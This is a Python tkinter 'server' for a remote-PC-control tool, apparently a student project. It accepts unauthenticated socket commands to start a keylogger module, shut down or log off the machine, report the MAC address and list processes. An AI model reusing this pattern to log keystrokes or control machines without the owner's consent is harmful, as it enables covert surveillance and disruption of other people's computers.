import tkinter as tk
import socket, PIL.ImageGrab, uuid
import os
import keylogger_server as kl 
import app_process_server as ap

main = tk.Tk()
main.geometry("200x200")
main.title("Server")

#Global variables
###############################################################################
global client
BUFSIZ = 1024 * 4
WIDTH = 1900
HEIGHT = 1000
###############################################################################
def keylogger():
    global client
    kl.keylog(client)
    return

def shutdown_logout():
    msg = client.recv(BUFSIZ).decode("utf8")
    if "SHUTDOWN" in msg:
        os.system('shutdown -s -t 15')
    elif "LOGOUT" in msg:
        os.system('shutdown -l')
    return

def mac_address():
    global client
    client.sendall(bytes(hex(uuid.getnode()), "utf8"))
    return

def app_process():
    global client
    ap.app_process(client)
    return

def live_screen():
    return

def directory_tree():
    return
#Connect
###############################################################################           
def Connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ''
    port = 5656
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(100)
    global client
    client, addr = s.accept()
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "KEYLOG" in msg:
            keylogger()
        elif "SHUTDOWN" in msg:
            shutdown_logout()
        elif "LIVESCREEN" in msg:
            live_screen()
        elif "APP_PRO" in msg:
            app_process()
        elif "MAC" in msg:
            mac_address()
        elif "DIRECTORY" in msg:
            directory_tree()
        elif "QUIT" in msg:
            client.close()
            s.close()
            return
###############################################################################    

tk.Button(main, text = "Open", command = Connect).place(x = 100, y = 100, anchor = "center")

main.mainloop()


